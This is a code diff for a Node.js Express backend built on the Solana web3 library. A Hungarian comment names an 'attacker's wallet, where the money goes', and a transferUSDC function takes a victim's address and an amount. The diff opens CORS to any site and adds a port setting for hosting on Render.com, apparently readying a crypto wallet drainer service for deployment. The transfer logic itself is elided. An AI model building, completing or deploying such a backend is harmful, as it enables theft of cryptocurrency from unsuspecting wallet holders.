@@ -2,8 +2,10 @@
 const express = require('express');
 const { Connection, Transaction, Keypair, sendAndConfirmTransaction } = require('@solana/web3.js');
 const bs58 = require('bs58');
+const cors = require('cors');
 
 const app = express();
+app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 
 // A támadó Solana wallet-e (ahová a pénz megy)
@@ -43,5 +45,9 @@ function transferUSDC(fromAddress, amount) {
     // USDC token transfer instruciton
     // ...
 }
+// Render.com automatikusan ad a PORT-t
+const port = process.env.PORT || 3000;
 
-app.listen(3000, () => console.log('[+] Backend running on port 3000'));
+app.listen(port, () => {
+  console.log(`✅ Backend running: http://localhost:${port}`);
+});
